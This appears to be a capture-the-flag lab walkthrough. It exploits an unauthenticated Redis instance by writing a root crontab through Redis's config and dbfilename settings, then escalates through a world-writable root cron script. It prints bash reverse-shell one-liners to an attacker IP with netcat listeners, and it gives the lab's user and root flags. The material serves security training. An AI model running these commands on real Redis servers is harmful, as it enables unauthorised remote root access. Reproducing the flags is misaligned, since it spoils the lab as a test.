---
title: RedPill
date: 2026-07-29 12:40:00 +0000
categories: [Walkthroughs, WebSecurity]
tags: [pt-garage, redis, rce, cron, privesc, web-exploitation, WebSecurity]
---

![Intro Banner](/assets/img/custom_banners/2026-07-29-ptg-redpill_banner.png)

**Unauthenticated Redis RCE → Writable Cron Script**

## Phase 1 — Recon
```bash
nmap -sC -sV <TARGET_IP>
```
Redis is exposed unauthenticated on 6379.

## Phase 2 — Confirm Unauthenticated Access
```bash
redis-cli -h <TARGET_IP> ping
```

## Phase 3 — RCE via SSH Key / Cron Write
Use the classic Redis RCE technique — write an SSH key into the vagrant user's `authorized_keys`, or drop a webshell if a web root is reachable. In this lab, the simplest path is writing a cron job directly via Redis's config/dbfilename trick:
```bash
redis-cli -h <TARGET_IP>
> config set dir /var/spool/cron/crontabs/
> config set dbfilename root
> set x "\n* * * * * root bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'\n"
> save
```
**Note:** Alternatively, write an SSH public key to `/home/vagrant/.ssh/authorized_keys` using the same `dir/dbfilename/set/save` technique.

## Phase 4 — Shell & User Flag
```bash
nc -lvnp 4444
# wait for cron / or ssh in with your planted key
cat /home/vagrant/user.txt
```

## Phase 5 — Privilege Escalation (Writable Root Cron Script)
```bash
cat /etc/cron.d/SystemMaintenanceCheck
ls -la /opt/SystemMaintenanceCheck.sh
```
The script is world-writable (666) and executed by root every minute:
```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1' >> /opt/SystemMaintenanceCheck.sh
nc -lvnp 5555
# wait up to 60s
```

## Phase 6 — Root Flag
```bash
cat /root/root.txt
```

![Walkthrough Screenshot](/assets/ptgarage_pages/ptg_lab_walkthroughs/page_11.png)

## Flags

| Type | Flag | Path |
|---|---|---|
| user | b590d10336bf79de85acb787ac8a5546 | `/home/vagrant/user.txt` |
| root | 3d876b826027b0200ccb6634e16dfbfa | `/root/root.txt` |
